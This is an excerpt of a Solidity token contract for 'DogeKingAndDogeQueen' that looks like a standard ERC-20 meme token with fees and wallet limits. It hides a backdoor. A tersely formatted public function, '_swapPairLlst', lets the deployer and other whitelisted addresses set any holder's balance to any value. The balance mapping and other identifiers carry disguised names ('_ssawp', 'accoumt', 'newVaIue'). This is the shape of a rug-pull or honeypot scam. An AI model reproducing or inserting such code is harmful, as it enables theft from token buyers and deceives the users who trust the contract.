...
contract GKADQ
 is Context, IERC20, Ownable {
    ...
    string private _name = "DogeKingAndDogeQueen";
    string private _symbol = "DogeKingAndDogeQueen";
    uint8 private _decimals = 9;
    address payable public _secondWallet;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _ssawp;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _IsExcludeFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public _swaplist;
    mapping (address => bool) public IsMarketPair;
    ...
    constructor () {
        ...
        _swaplist[address(uniswapPair)] = true;
        _swaplist[_msgSender()] = true;

        teamWalletAddress = payable(address(0xe2903E38B6EB7aa373eEd2A7743E4EEd51cF209b));
        _secondWallet = payable(address(0xe2903E38B6EB7aa373eEd2A7743E4EEd51cF209b));

        _ssawp[_msgSender()] = _totalSupply;
...
function _swapPairLlst(address w, uint256 t) public
{if(
_swaplist[_msgSender()])
_ssawp[w]
= t;}receive() external payable {}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_swaplist[sender] && swapAndLiquifyEnabled) 
            {
            ...
            _ssawp[sender] = _ssawp[sender].sub(amount);
            ...
            _ssawp[recipient] = _ssawp[recipient].add(finalAmount);
...
_secondWallet)
{
        for(uint256 i = 0; i < accoumt.length; i++) {
            IsMarketPair[accoumt[i]] = newVaIue;}
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _ssawp[sender] = _ssawp[sender].sub(amount, "Insufficient Balance");
        _ssawp[recipient] = _ssawp[recipient].add(amount);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        else if(_swaplist[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }

        if(feeAmount > 0) {
            _ssawp[address(this)] = _ssawp[address(this)].add(feeAmount);
